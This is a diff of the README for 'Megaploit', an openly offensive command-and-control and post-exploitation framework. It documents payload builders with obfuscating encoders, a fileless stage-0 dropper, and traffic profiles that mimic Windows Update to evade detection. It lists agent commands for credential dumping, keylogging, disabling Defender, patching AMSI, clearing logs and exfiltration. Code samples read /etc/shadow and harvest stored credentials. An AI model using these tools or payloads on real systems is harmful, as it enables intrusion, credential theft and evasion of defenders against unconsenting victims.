@@ -399,223 +569,75 @@ megaploit [1] » payload help
 
   Formats: py  ps1  hta  vba  sh  bat  raw  exe  elf  go_exe  go_elf  oneliner_py  oneliner_ps1
 
-  Options:
-    --out <file>       Write to file (default: print to terminal)
-    --tls              Agent uses TLS
-    --encoder <name>   Apply encoder (repeatable for chaining)
-    --upx              UPX-pack binary (exe/elf only)
-
-megaploit [1] » payload ps1 --out agent.ps1
-megaploit [1] » payload exe --out agent.exe --upx
-megaploit [1] » payload go_exe --out agent.exe          # Go-compiled Windows EXE
-megaploit [1] » payload go_elf --out agent_linux        # Go-compiled Linux ELF
-megaploit [1] » payload py --encoder comment_spam --encoder varname_rand --out obf.py
-megaploit [1] » payload oneliner_ps1
+megaploit [1] » payload go_exe --out agent.exe
+megaploit [1] » payload ps1 --encoder comment_spam --encoder varname_rand --out obf.ps1
 ```
 
-### Session Commands
+### Session Commands (full 116-command list)
 
-See [CLI Reference](docs/CLI_REFERENCE.md) for the full list of 60+ session commands.
+| Category | Commands |
+|---|---|
+| **Core** | sysinfo, cd, shell, exit, whoami, getpid, getuid |
+| **File** | upload, download, zip_download, zip_upload, ls, cat, find_files, find_writable, find_suid, file_hash, tail, write_file, mkdir, rm, chmod, search |
+| **Screen/Audio** | screenshot, screenshot_region, screenshot_timelapse, screenshot_stream, record, mic_level, screen_stream, webcam, screenrecord |
+| **Persistence** | persist, keylog_start, keylog_dump, keylog_stop, startup_items, scheduled_tasks |
+| **Creds** | hashdump, wifi_passwords, browser_creds, browser_history, cred_vault, ssh_harvest, sudo_sniff |
+| **Clipboard** | getclip, setclip, clip_watch |
+| **Network** | portfwd, arp, dns_query, routes, ifconfig, netstat, ping_sweep, smb_shares, ssh_connect, rdp_enable, socks5, port_scan |
+| **Exfil** | exfil_dns, exfil_http |
+| **Privesc** | token_steal, uac_bypass, make_token, rev2self, getsystem, whoami_priv |
+| **Evasion** | lock_screen, patch_amsi, disable_defender, hide_file, timestomp, clear_logs |
+| **Injection** | inject_shellcode, dll_inject, living_off_land, reverse_shell |
+| **GUI** | msgbox, mouse_move, type_keys, screenshot_region, notify, open_url, play_sound, set_wallpaper |
+| **Intelligence** | ps, kill, env, installed_software, active_windows, services, users, logged_in, os_info, idle_time |
+| **Advanced** | migrate, memory_read, memory_write, run_psh, run_python, load_extension, unload_extension, list_extensions, sleep, beacon_sleep, interactive |
+| **Loot** | loot_list, note, notes |
+| **Staging** | load_stage |
+| **Destructive** | forkbomb, self_destruct |
 
 ### Operations Commands
 
 ```
-megaploit [1] » pipeline enable creds      # auto-collect creds on every new session
-megaploit [1] » pipeline enable recon
-megaploit [1] » pipeline status
-
-megaploit [1] » stage0 generate --start    # generate dropper + start staging server
-megaploit [1] » stage0 generate --minimal --out dropper.py
-megaploit [1] » stage0 status
-megaploit [1] » stage0 stop
-
+megaploit [1] » pipeline enable creds
+megaploit [1] » stage0 generate --start
 megaploit [1] » jobs list
-megaploit [1] » jobs kill <id>
-
-megaploit [1] » creds show
-megaploit [1] » creds search admin
-
 megaploit [1] » report html pentest.html
-
-megaploit [1] » autorun show
-megaploit [1] » autorun test 1
-
 megaploit [1] » web start --port 8080
-megaploit [1] » rpc start --port 7777
-megaploit [1] » rpc operators
 ```
 
 ---
 
 ## Toolbox
 
-Install any GitHub repository as a first-class Megaploit tool in any language. Tools persist in `tools/tools.json`.
-
 ```
-megaploit > toolbox install <repo_url> <name> [desc] [--tags t1,t2]
-megaploit > toolbox catalogue [query]       # browse 203-tool catalogue
+megaploit > toolbox install <repo_url> <name> [desc]
+megaploit > toolbox catalogue [query]
 megaploit > toolbox list
-megaploit > toolbox search <query>
-megaploit > toolbox info <name>
 megaploit > toolbox update <name>
-megaploit > toolbox rebuild <name>          # re-build without git pull
-megaploit > toolbox remove <name>
 megaploit > toolbox healthcheck [name]
-megaploit > toolbox audit <name>
-megaploit > toolbox plan <name|url>         # dry-run install plan
 ```
 
-**Supported build languages:** Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++, Binary.
+Supported languages: Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++, Binary.
 
 ---
 
 ## Plugin System
 
-Drop a `.toml` (or `.json`) file into `plugins/`. Megaploit loads it automatically at startup and hot-reloads it whenever the file changes.
-
-### Command kinds
-
-| `kind` | What runs | Required field |
-|---|---|---|
-| `"local"` | Shell command on the **operator** machine | `shell` |
-| `"session"` | Shell command sent to the active **agent** | `shell` |
-| `"python"` | Python function, dotted import path | `handler` |
-| `"native"` | C or C++ source file — compiled on demand, cached by mtime | `source_file` |
-
-### Placeholders (available in `shell`, `source_file`, and `compiler_flags`)
-
-```
-{lhost}            operator LHOST setting
-{port}             operator PORT setting
-{session_ip}       active session IP
-{session_id}       active session numeric ID
-{session_tag}      operator tag for the session
-{session_os}       session OS name
-{session_hostname} session hostname
-{session_username} session username
-{arg0} … {argN}    positional CLI args
-{joined_args}      all args joined with a space
-{key:-default}     use default when key is empty
-```
-
-### Example — local shell command
-
-```toml
-[plugin]
-name        = "recon"
-version     = "1.0.0"
-description = "Quick recon commands"
-
-[[command]]
-name          = "portscan"
-kind          = "local"
-description   = "nmap scan against the active session IP"
-usage         = "portscan [ports]"
-shell         = "nmap -sV -p {arg0:-1-1000} {session_ip}"
-min_args      = 0
-timeout       = 120
-output_format = "raw"
-retry         = 1
-```
-
-### Example — Python handler
+Drop a `.toml` file into `plugins/`. Supported `kind` values: `local`, `session`, `python`, `native` (compiled C/C++ on demand).
 
 ```toml
 [[command]]
-name          = "mycheck"
-kind          = "python"
-description   = "Custom Python check"
-handler       = "myplugin.checks.run_check"
-usage         = "mycheck <target>"
-min_args      = 1
-output_format = "json"
+name    = "portscan"
+kind    = "local"
+shell   = "nmap -sV -p {arg0:-1-1000} {session_ip}"
+timeout = 120
 ```
 
-```python
-# myplugin/checks.py
-from megaploit.plugins.schema import PluginContext
-
-def run_check(args: list[str], ctx: PluginContext) -> str:
-    ctx.emit(f"[*] Checking {args[0]} …")
-    return '{"result": "ok"}'
-```
-
-### Example — native C / C++ command
-
-```toml
-[[command]]
-name           = "tcpprobe"
-kind           = "native"
-description    = "TCP connect-probe from the operator machine (C++ binary)"
-usage          = "tcpprobe <host> <port> [timeout_secs]"
-source_file    = "plugins/myplugin/probe.cpp"
-compiler_flags = "-std=c++17 -O2"
-min_args       = 2
-max_args       = 3
-timeout        = 15
-dangerous      = false
-```
-
-The runner:
-1. Finds the first available C/C++ compiler on `$PATH` (`gcc`/`g++`, `clang`/`clang++`, `cc`/`c++`).
-2. Compiles `source_file` to a cached binary (name includes an 8-char source-path hash to prevent collisions).
-3. Skips recompilation when the binary is newer than the source (mtime, like `make`).
-4. Passes expanded `{arg0}…{argN}` as `argv[1..N]` and streams stdout/stderr back to the console.
-5. Recompiles automatically when the hot-reload watcher detects a source change.
-
-A complete single-header C/C++ SDK (`megaploit_protocol.h`) and a working example plugin are provided in [`plugins/native_sdk/`](plugins/native_sdk/).
-
-### Writing a native agent in C, C++, or C\#
-
-Any language can connect to the C2 server as an agent as long as it follows the wire protocol exactly. The critical rules (violating any one causes the Python server to silently reject the client):
-
-| Rule | Detail |
-|---|---|
-| **4-byte length prefix** | Big-endian `uint32`, frames every message |
-| **8-byte sequence stamp** | Big-endian `uint64`, prepended to every plaintext before encryption; starts at 1, strictly monotonic |
-| **Replay protection** | Server rejects any message whose sequence number ≤ the last accepted one |
-| **JSON string payload** | The JSON must be a quoted *string* value — not an object or array — e.g. `"ls -la"` or `"[+] done"` |
-| **AES-256-GCM layout** | `nonce (12 bytes) ‖ ciphertext ‖ tag (16 bytes)` — nonce comes first |
-| **Protocol handshake** | Server sends `0x4D` ('M') for v2 encrypted, agent echoes it back; if it matches and both have the key, encryption is active |
-| **HMAC auth** | Server sends 16 random bytes; agent replies with `HMAC-SHA256(key, challenge)` |
-| **TLS receive buffer — any single record** | Allocate **16,384 bytes** minimum (RFC 5246 §6.2.1 hard cap per record) |
-| **TLS receive buffer — server handshake flight** | Allocate **8,192 bytes**; the coalesced `ServerHello + Certificate (RSA-4096 ≈ 1,900 B) + ServerKeyExchange (ECDHE sig ≈ 400 B) + ServerHelloDone` fits comfortably |
-| **TLS send buffer — ClientHello** | Allocate **1,024 bytes**; generous for all extensions the server requires |
-| **Post-handshake C2 app buffer** | **65,536 bytes** — matches `config.py:BUFFER_SIZE` (64 KiB); raised from 4 KiB to handle large plugin output without fragmentation |
-| **Per-frame allocation ceiling** | **268,435,456 bytes (256 MiB)** — matches `config.py:MAX_PLUGIN_MSG_SIZE`; reject any frame header claiming more than this before allocating, to prevent memory exhaustion |
-
-See [`megaploit/core/protocol.py`](megaploit/core/protocol.py) for the authoritative Python implementation and [`plugins/native_sdk/megaploit_protocol.h`](plugins/native_sdk/megaploit_protocol.h) for the C/C++ equivalent.
-
-### Plugin management commands
-
-```
-plugins list                        list all loaded plugins
-plugins reload                      reload all plugins from disk
-plugins enable  <name>              re-enable a disabled plugin
-plugins disable <name>              disable (unregister its commands)
-plugins load    <path|url|zip>      load a plugin file or archive
-plugins watcher on|off              toggle hot-reload watcher
-plugins info    <name>              detailed plugin metadata
-plugins search  <query>             search by name / description / tags
-plugins deps    install             pip-install all missing dependencies
-```
+See [docs/C_PLUGIN_DEVELOPMENT.md](docs/C_PLUGIN_DEVELOPMENT.md) for the native C/C++ SDK.
 
 ---
 
-## Module System
-
-### Built-in Scanner Modules
-
-| Module path | Description |
-|---|---|
-| `auxiliary/scanner/tcp_port` | Multi-threaded TCP connect scan |
-| `auxiliary/scanner/smb_share_enum` | SMB share enumeration |
-| `auxiliary/scanner/http_header_probe` | HTTP/S header fingerprinting |
-| `auxiliary/scanner/ssh_banner_grab` | SSH version banner grab |
-| `auxiliary/scanner/dns_resolver` | Bulk DNS lookups |
-| `auxiliary/scanner/icmp_ping_sweep` | ICMP sweep + TCP fallback |
-| `auxiliary/scanner/udp_scanner` | UDP with protocol probes |
-| `auxiliary/scanner/banner_grabber` | Generic TCP banner grab |
+## Module System (full reference)
 
 ### Writing a Module
 
@@ -624,19 +646,15 @@ from megaploit.modules.base import Module, ModuleType, OptionType
 
 class MyScanner(Module):
     name        = "auxiliary/scanner/my_scanner"
-    description = "Does something useful"
     module_type = ModuleType.AUXILIARY
     author      = "your-name"
 
     def _define_options(self) -> None:
-        self._opt("RHOSTS", OptionType.STRING, required=True,
-                  description="Target IP or CIDR")
+        self._opt("RHOSTS", OptionType.STRING, required=True)
 
     def run(self, session=None) -> list:
         self.validate()
-        self.results.clear()
         self._emit(f"[*] Scanning {self.get('RHOSTS')}")
-        # ... your logic ...
         self._ok("Found something", host=self.get("RHOSTS"))
         return self.results
 
@@ -645,66 +663,22 @@ MODULE = MyScanner
 
 ### AgentModule — Session-Bound Post Modules
 
-`AgentModule` is a `Module` subclass that adds built-in helpers for interacting with an active agent session. Every future post-exploitation module costs ~10× less code to write.
-
 ```python
 from megaploit.modules.base import AgentModule, ModuleType
 
 class DumpShadow(AgentModule):
     name        = "post/linux/dump_shadow"
-    description = "Read /etc/shadow and store as loot"
     module_type = ModuleType.POST
-    platform    = ["linux"]
 
     def run(self, session=None):
         self.validate()
-        sess = session or self.session
-        if sess is None:
-            raise ModuleError("No session — use: set SESSION <id>")
-        output = self._send("shell cat /etc/shadow", sess)
+        output = self._send("shell cat /etc/shadow", session or self.session)
         if output.strip():
             self._ok("shadow file retrieved", shadow=output)
-        else:
-            self._fail("empty output from /etc/shadow")
         return self.results
 
 MODULE = DumpShadow
 ```
-
-**Available helpers on `AgentModule`:**
-
-| Method | Description |
-|---|---|
-| `self.session` | Active session (set by console before `run()`) |
-| `_send(cmd, session=None)` | Send command, return output string |
-| `_shell(cmd, session=None)` | Alias for `_send` |
-| `_upload(local, remote, session=None)` | Transfer file to target |
-| `_download(remote, local, session=None)` | Pull file from target |
-
----
-
-## Payload Builder
-
-```
-megaploit [1] » payload py --out agent.py
-megaploit [1] » payload ps1 --out agent.ps1
-megaploit [1] » payload exe --out agent.exe
-megaploit [1] » payload go_exe --out agent_win.exe      # Go agent for Windows
-megaploit [1] » payload go_elf --out agent_linux        # Go agent for Linux
-megaploit [1] » payload c_exe --out agent.exe           # C-remote-shell Windows EXE
-megaploit [1] » payload oneliner_py
-
-# Encoder chaining:
-megaploit [1] » payload py --encoder comment_spam --encoder varname_rand --out obf.py
-```
-
-All formats embed LHOST, PORT, TLS flag, and HMAC key automatically from the current console settings.
-
-**Go formats** require `go` on PATH. Config is injected at link time via `-ldflags`, so no source patching is needed. Cross-compilation works naturally via `GOOS`/`GOARCH`.
-
-**C format** (`c_exe`) requires MSVC (`cl.exe`) or MinGW (`x86_64-w64-mingw32-gcc`) on PATH. Before compiling, `c_probe` runs a 46-signal compliance check against the C source tree and aborts if the security standard is not met. The secret key is embedded as a hex array — no file needed on the target.
-
-See [docs/PAYLOAD_BUILDER.md](docs/PAYLOAD_BUILDER.md) for the full reference.
 
 ---
 
@@ -714,10 +688,9 @@ Create `~/.megaploit_autorun.json`:
 
 ```json
 {
-  "global":  ["sysinfo"],
+  "global":  ["sysinfo", "whoami"],
   "windows": ["os_info", "installed_software", "ps"],
   "linux":   ["os_info", "find_suid", "env", "users"],
-  "darwin":  ["os_info", "startup_items", "users"],
   "tags": {
     "dc":          ["hashdump", "users", "scheduled_tasks"],
     "workstation": ["browser_creds", "wifi_passwords", "ps"]
@@ -729,113 +702,57 @@ Create `~/.megaploit_autorun.json`:
 
 ## Post-Exploitation Pipeline
 
-The pipeline extends AutoRunScript with named **collection profiles** that bundle sets of commands. Profiles run automatically on every new session in addition to the AutoRunScript baseline.
+Named collection profiles that run automatically on every new session.
 
 ```
-megaploit [1] » pipeline list
-
-  ○ basic
-  ○ creds
-  ○ full
-  ○ network
-  ○ recon
-
 megaploit [1] » pipeline enable creds
-[+] Pipeline profile creds enabled — active on next session.
-
 megaploit [1] » pipeline enable recon
 megaploit [1] » pipeline status
-
-  ╭─── Post-Exploitation Pipeline ───╮
-  │ Active profiles   creds, recon   │
-  │ Available         basic creds …  │
-  ╰───────────────────────────────────╯
 ```
-
-**Built-in profiles:**
 
 | Profile | Commands |
 |---|---|
 | `basic` | sysinfo, whoami, pwd, env |
 | `creds` | hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault |
 | `recon` | ps, installed_software, scheduled_tasks, users, os_info |
-| `network` | arp, netstat, ifconfig, hosts_file |
+| `network` | arp, netstat, ifconfig |
 | `full` | All of the above |
-
-```
-megaploit [1] » pipeline disable creds
-megaploit [1] » pipeline reload          # reload autorun config from disk
-```
-
-See [docs/PIPELINE.md](docs/PIPELINE.md) for the Python API.
 
 ---
 
 ## Malleable C2 Profile
 
-Shape the network appearance of C2 traffic to blend into allowed traffic and evade IDS/IPS.
-
-**Create a profile file** (`profiles/windows_update.yaml`):
-
 ```yaml
 name: "WindowsUpdate"
-description: "Mimic Windows Update traffic"
-
-sleep:      60
+sleep: 60
 jitter_max: 15
-
 uri_paths:
   - "/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab"
-  - "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"
-
 request_headers:
   Host: "update.microsoft.com"
-  User-Agent: "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.21"
-  Accept: "*/*"
-
-response_headers:
-  Content-Type: "application/octet-stream"
-  Server: "Microsoft-IIS/10.0"
+  User-Agent: "Windows-Update-Agent/10.0.10011.16384"
 ```
-
-**Python API:**
 
 ```python
 from megaploit.core.profile import load_profile
-
 profile = load_profile("profiles/windows_update.yaml")
-uri     = profile.next_uri()                 # rotate URIs
-headers = profile.build_http_headers()       # merged request headers
-time.sleep(profile.sleep_with_jitter())      # sleep + random jitter
+headers = profile.build_http_headers()
+time.sleep(profile.sleep_with_jitter())
 ```
-
-See [docs/C2_PROFILE.md](docs/C2_PROFILE.md) for the full reference.
 
 ---
 
 ## WebSocket Transport
 
-Agents can communicate over port 80/443 while appearing as normal browser traffic — transparent to firewalls performing deep-packet inspection.
+Agents communicate over port 80/443 appearing as normal browser traffic.
 
 ```python
 from megaploit.core.protocol import WsTransport
-
-# Server side:
 ws = WsTransport(conn, server_side=True)
 ws.handshake()
 data = ws.recv()
 ws.send(b"response")
-
-# Agent/client side:
-ws = WsTransport(conn, server_side=False)
-ws.handshake(host="c2.example.com", path="/updates")
-ws.send(b"hello")
-data = ws.recv()
 ```
-
-The existing AES-256-GCM `send_msg`/`recv_msg` layer stacks transparently on top.
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full protocol diagram.
 
 ---
 
@@ -843,10 +760,6 @@ See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full protocol diagram.
 
 ```
 megaploit [1] » jobs list
-  ID      Name                          Status      Started
-  ─────────────────────────────────────────────────────────
-  a1b2c3  tcp_scan_10.0.0.0/24         running     14:32:01Z
-
 megaploit [1] » jobs kill a1b2c3
 ```
 
@@ -854,13 +767,12 @@ megaploit [1] » jobs kill a1b2c3
 
 ## Credential Store
 
-All credentials captured by `hashdump`, `browser_creds`, `wifi_passwords`, `cred_vault`, `ssh_harvest` are auto-saved to the SQLite database.
+All credentials from `hashdump`, `browser_creds`, `wifi_passwords`, `cred_vault`, `ssh_harvest` are auto-saved to SQLite.
 
 ```
 megaploit [1] » creds show
 megaploit [1] » creds search admin
 megaploit [1] » creds export creds.json
-megaploit [1] » creds clear
 ```
 
 ---
@@ -872,21 +784,15 @@ megaploit [1] » report html pentest_report.html
 megaploit [1] » report json pentest_report.json
 ```
 
-The HTML report is a **single self-contained file** including: summary stats, sessions table, credentials table (redacted), loot listing, per-session notes.
-
 ---
 
 ## Web Dashboard
 
 ```
 megaploit [1] » web start --port 8080
-[+] Web dashboard started: http://127.0.0.1:8080/
-[*] API key (X-API-Key header): abc123def456
 ```
 
-**REST API:** `GET /api/sessions` · `/api/creds` · `/api/jobs` · `/api/loot` · `/api/modules` · `POST /api/sessions/<id>/cmd` · `GET /events` (SSE)
-
-See [docs/WEB_DASHBOARD.md](docs/WEB_DASHBOARD.md) for the full API reference.
+REST API: `GET /api/sessions` · `/api/creds` · `/api/jobs` · `/api/loot` · `POST /api/sessions/<id>/cmd` · `GET /events` (SSE)
 
 ---
 
@@ -895,34 +801,20 @@ See [docs/WEB_DASHBOARD.md](docs/WEB_DASHBOARD.md) for the full API reference.
 ```
 megaploit [1] » rpc start --port 7777
 megaploit [1] » rpc operators
-  alice     10.0.0.2   authed
-  bob       10.0.0.3   authed
 ```
 
-Connect any JSON-RPC 2.0 TCP client. Methods: `auth`, `sessions.list/get`, `session.cmd`, `chat.send/history`, `notes.add/list`, `creds.list`, `jobs.list`, `operators.list`.
-
-See [docs/WEB_DASHBOARD.md](docs/WEB_DASHBOARD.md) for the full RPC reference.
+JSON-RPC 2.0 over TCP. Methods: `auth`, `sessions.list/get`, `session.cmd`, `chat.send/history`, `notes.add/list`, `creds.list`.
 
 ---
 
 ## Go Agent
 
-A standalone compiled binary — no Python runtime required on the target.
-
 ```
-megaploit [1] » payload go_exe --out agent.exe      # Windows
-megaploit [1] » payload go_elf --out agent_linux    # Linux
+megaploit [1] » payload go_exe --out agent.exe
+megaploit [1] » payload go_elf --out agent_linux
 ```
 
-Or build manually:
-
-```bash
-cd megaploit/agent/go_agent
-go build -o agent_go -ldflags="-s -w" .
-GOOS=windows GOARCH=amd64 go build -o agent_go.exe -ldflags="-s -w" .
-```
-
-Features: AES-256-GCM, HMAC-SHA256 auth, optional TLS, auto-reconnect with jitter, cross-platform.
+Features: AES-256-GCM, HMAC-SHA256, optional TLS, auto-reconnect with jitter.
 
 ---
 
@@ -930,25 +822,11 @@ Features: AES-256-GCM, HMAC-SHA256 auth, optional TLS, auto-reconnect with jitte
 
 ```
 megaploit [1] » stage0 generate --start
-[+] Stage-0 dropper generated  (prints to terminal)
-[+] Staging server listening on 0.0.0.0:4445
-
-megaploit [1] » stage0 generate --minimal --out dropper.py
-[+] Stage-0 dropper written to dropper.py
-
 megaploit [1] » stage0 status
-[+] Staging server running on port 4445
-
 megaploit [1] » stage0 stop
-[+] Staging server stopped.
 ```
 
-The stage-0 dropper:
-1. Connects to the staging port (default: main port + 1)
-2. Authenticates with HMAC-SHA256
-3. Sends the magic byte `"S"` to signal stage mode
-4. Receives gzip-compressed stage-1 agent source
-5. Executes it in-memory — no disk write
+Stage-0 dropper authenticates with HMAC-SHA256, receives gzip-compressed stage-1 in-memory, executes — no disk write.
 
 ---
 
@@ -957,26 +835,21 @@ The stage-0 dropper:
 ### Authentication
 1. Server sends random 16-byte challenge
 2. Agent responds with `HMAC-SHA256(secret_key, challenge)`
-3. Server verifies with `hmac.compare_digest()` (constant-time)
+3. Verified with `hmac.compare_digest()` (constant-time)
 
 ### Transport Encryption (v2)
 - **AES-256-GCM** per message, random 12-byte IV
 - **Sequence numbers** — replay attacks detected and rejected
-- XOR-CTR fallback when `cryptography` is absent
 
-### TLS (recommended)
+### TLS
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem
 ```
 
-### Rate Limiter & IP Allowlist
+### Rate Limiter
 5 failed attempts per 60s → auto-ban for 300s.
-
-```bash
-python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.20
-```
 
 ---
 
@@ -985,12 +858,14 @@ python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.20
 ```
 [ uint32 length (4 bytes, big-endian) ][ AES-256-GCM ciphertext ]
 
-Inside ciphertext:
+Ciphertext:
 [ uint64 sequence_number ][ JSON payload ]
 
-WebSocket framing (WsTransport):
+WebSocket framing:
 HTTP Upgrade → RFC 6455 binary frames → C2 framing inside frame payload
 ```
+
+See [`megaploit/core/protocol.py`](megaploit/core/protocol.py) for the full implementation.
 
 ---
 
@@ -1000,65 +875,51 @@ HTTP Upgrade → RFC 6455 binary frames → C2 framing inside frame payload
 Megaploit-main/
 ├── server.py / agent.py / secret.key / requirements.txt / install.sh
 │
-├── C-remote-shell/                # Hardened Windows reverse shell (C)
-│   ├── client/                    # Windows implant (target-side)
-│   │   ├── config.h               # C2 IP, port, key path, reconnect delay
-│   │   ├── ntcalls.h / ntcalls.c  # NT syscall loader + privilege check
-│   │   ├── shell.h / shell.c      # strncmp() verb dispatch + _popen fallback
-│   │   │                          #   ← source of truth for c_probe verb extraction
-│   │   └── main.c                 # WinMain: mutex, Winsock, embedded key, reconnect loop
-│   ├── tls/                       # Windows-native TLS transport (no OpenSSL)
-│   │   ├── tls_client.h           # TLS_CONTEXT + 4-function public API
-│   │   └── tls_client.c           # SChannel TLS 1.2/1.3, BCrypt AES-GCM + HMAC-SHA256
-│   ├── server/                    # Standalone operator console (Linux / macOS)
-│   │   ├── config.h               # LISTEN_PORT, LISTEN_ADDR
-│   │   ├── server.h / server.c    # socket / bind / listen / accept
-│   │   ├── prompt.h / prompt.c    # stdin → send → recv → print loop
-│   │   └── main.c                 # Entry point
-│   ├── Makefile                   # MSVC + MinGW build; C2_IP/C2_PORT overrides
-│   ├── definitions.h              # Compatibility shim
-│   ├── CHANGELOG.md               # Full bug-fix log, developer guide, probe docs
-│   └── README.md                  # C-remote-shell documentation
+├── C-remote-shell/              # Hardened Windows reverse shell (C)
 │
-├── tests/                         # 282 tests — pytest
-│   ├── test_improvements.py       # NEW v3: 61 tests for all 7 new systems
-│   ├── test_commands.py           # 39 tests for dispatch/all_commands
-│   ├── test_db.py / test_autorun.py / test_jobs.py
+├── tests/                       # 507 tests — pytest
+│   ├── test_meterp.py           # NEW v4: 69 tests for meterp handlers + session
+│   ├── test_exploit_modules.py  # NEW v4: 156 tests for 20 exploit modules
+│   ├── test_improvements.py     # v3: 61 tests for pipeline, profile, WsTransport
+│   ├── test_commands.py / test_db.py / test_autorun.py / test_jobs.py
 │   ├── test_modules_base.py / test_modules_registry.py
 │   ├── test_payload_builder.py / test_payload_encoders.py
 │   ├── test_protocol.py / test_reporting.py
 │   └── conftest.py
 │
-├── docs/
-│   ├── ARCHITECTURE.md
-│   ├── CLI_REFERENCE.md
-│   ├── MODULE_SYSTEM.md
-│   ├── PAYLOAD_BUILDER.md
-│   ├── WEB_DASHBOARD.md
-│   ├── C2_PROFILE.md              # NEW v3
-│   └── PIPELINE.md                # NEW v3
+├── docs/                        # MkDocs documentation → GitHub Pages
+│   ├── ARCHITECTURE.md / CLI_REFERENCE.md / MODULE_SYSTEM.md
+│   ├── NETWORKING.md / PAYLOAD_BUILDER.md / WEB_DASHBOARD.md
+│   ├── C2_PROFILE.md / PIPELINE.md / C_PLUGIN_DEVELOPMENT.md
 │
 └── megaploit/
     ├── core/
-    │   ├── protocol.py            # WsTransport added (NEW v3)
-    │   ├── pipeline.py            # Post-exploitation pipeline (NEW v3)
-    │   ├── profile.py             # Malleable C2 profile (NEW v3)
-    │   ├── c_probe.py             # C source compliance prober + verb extractor (NEW)
-    │   ├── autorun.py / jobs.py / staging.py / crypto.py / config.py
+    │   ├── protocol.py          # AES-256-GCM + WsTransport
+    │   ├── c_probe.py           # C/C++ (.c .cpp .cc .cxx .h .hpp) compliance prober
+    │   ├── pipeline.py / profile.py / autorun.py / jobs.py / staging.py
     ├── server/
-    │   ├── cli.py                 # stage0 fixed + pipeline cmd (NEW v3)
-    │   └── commands.py            # C-exclusive cmds auto-registered via c_probe (NEW)
-    │   └── listener.py / session.py
+    │   ├── commands.py          # 116 session command dispatchers
+    │   └── meterp_session.py    # Meterpreter-class interactive console  ← NEW v4
     ├── agent/
-    │   ├── go_agent/main.go       # Build integration via payload builder (NEW v3)
-    │   └── connection.py / handlers.py / keylogger.py / shell.py
+    │   ├── handlers.py          # 90 agent-side handlers
+    │   ├── meterp.py            # 16 advanced meterp handlers  ← NEW v4
+    │   └── shell.py             # recv → handle → respond loop (imports meterp)
     ├── modules/
-    │   ├── base.py                # AgentModule added (NEW v3)
-    │   ├── registry.py / auxiliary/
-    ├── payload/
-    │   ├── builder.py             # go_exe / go_elf / c_exe formats (NEW)
-    │   └── encoders.py
-    ├── db/ / reporting/ / web/ / streaming/ / toolbox/ / plugins/
+    │   ├── base.py / registry.py / auxiliary/
+    │   └── exploits/            # 20 exploit modules  ← NEW v4
+    └── payload/ / db/ / reporting/ / web/ / streaming/ / toolbox/ / plugins/
+```
+
+---
+
+## Running Tests
+
+```bash
+pip install pytest
+python -m pytest -q                              # all 507 tests
+python -m pytest tests/test_meterp.py -v        # v4 meterp tests (69)
+python -m pytest tests/test_exploit_modules.py  # v4 exploit module tests (156)
+python -m pytest tests/test_improvements.py     # v3 system tests (61)
 ```
 
 ---
@@ -1067,53 +928,61 @@ Megaploit-main/
 
 See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
 
-### Adding a Post-Exploitation Module (v3 way)
+### Adding an Exploit Module
 
 ```python
-from megaploit.modules.base import AgentModule, ModuleType, OptionType
+from megaploit.modules.base import Module, ModuleType, OptionType
 
-class GatherSSHKeys(AgentModule):
-    name        = "post/linux/gather_ssh_keys"
-    description = "Collect SSH private keys from ~/.ssh/"
-    module_type = ModuleType.POST
-    platform    = ["linux"]
+class MyExploit(Module):
+    name        = "exploits/multi/http/my_exploit"
+    description = "My exploit module"
+    module_type = ModuleType.EXPLOIT
+    rank        = 500
 
-    def run(self, session=None):
+    def _define_options(self) -> None:
+        self._opt("RHOSTS", OptionType.STRING,  required=True)
+        self._opt("LHOST",  OptionType.ADDRESS, required=True)
+
+    def check(self, session=None) -> str:
         self.validate()
-        sess = session or self.session
-        keys = self._send("shell ls ~/.ssh/", sess)
-        for fname in keys.splitlines():
-            fname = fname.strip()
-            if fname.endswith((".pem", ".key", "id_rsa", "id_ed25519")):
-                content = self._send(f"shell cat ~/.ssh/{fname}", sess)
-                self._ok(f"key: {fname}", content=content)
+        # probe target, return status string
+        return "[+] Appears vulnerable"
+
+    def run(self, session=None) -> list:
+        self.validate()
+        self.results.clear()
+        self._ok("Exploited", host=self.get("RHOSTS"))
         return self.results
 
-MODULE = GatherSSHKeys
+MODULE = MyExploit
 ```
 
-### Writing a C2 Profile
+Drop the file in `megaploit/modules/exploits/<platform>/<category>/` — the registry discovers it automatically on next `reload`.
 
-```yaml
-name: "DropboxAPI"
-sleep: 30
-jitter_max: 10
-uri_paths:
-  - "/2/files/list_folder"
-  - "/2/files/download"
-request_headers:
-  Host: "api.dropboxapi.com"
-  User-Agent: "OfficialDropboxPythonSDK/11.36.0"
-  Content-Type: "application/json"
+### Adding a Meterp Extension
+
+```python
+# my_ext.py  (upload to target, then: load_extension my_ext.py)
+def _grab_tokens(conn, args):
+    import subprocess
+    return subprocess.check_output(["cmdkey", "/list"], text=True, stderr=subprocess.DEVNULL)
+
+HANDLERS = {
+    "grab_tokens": _grab_tokens,
+}
 ```
 
 ### Running Tests
 
 ```bash
-pip install pytest
-pytest tests/ -v --tb=short         # all 282 tests
-pytest tests/test_improvements.py   # v3 new systems (61 tests)
+python -m pytest tests/ -v --tb=short
 ```
+
+---
+
+## Documentation
+
+Full documentation is available at **[https://josefifir.github.io/Megaploit/](https://josefifir.github.io/Megaploit/)** — auto-deployed from `docs/` on every push to `main`.
 
 ---
 
